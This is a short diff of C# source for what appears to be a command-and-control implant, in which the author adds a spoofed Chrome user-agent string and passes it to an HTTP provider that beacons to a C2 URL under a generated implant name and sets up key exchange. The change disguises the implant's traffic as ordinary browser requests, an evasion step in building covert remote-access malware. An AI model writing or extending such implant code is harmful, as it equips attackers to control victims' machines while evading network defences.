@@ -9,8 +9,12 @@ namespace Implant
 {
     class Implant
     {
+        //THESE VALUES NEED TO BE CHANGED BEFORE GENERATING THE IMPLANT OK?
+        private string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36";
 
 
+
+        //THESE VALUES NEED TO BE CHANGED BEFORE GENERATING THE IMPLANT OK?
         private CommunicationProviderInterface comprov;
 
         private string name;
@@ -22,7 +26,7 @@ namespace Implant
             //By Default we wait 5 sec between asking for stuff unless its update. Need to add some randomness in there but thats for later
             this.name = generateImplantName();
 
-            this.comprov = new HTTPCommunicationProvider(c2Url, this.name);
+            this.comprov = new HTTPCommunicationProvider(c2Url, this.name, userAgent);
 
             this.comprov.keyExchangeSetup();
             //Get config aka time between request + comm method. A bit weird to get comm method after I already interacted over HTTP but wtv todo lol
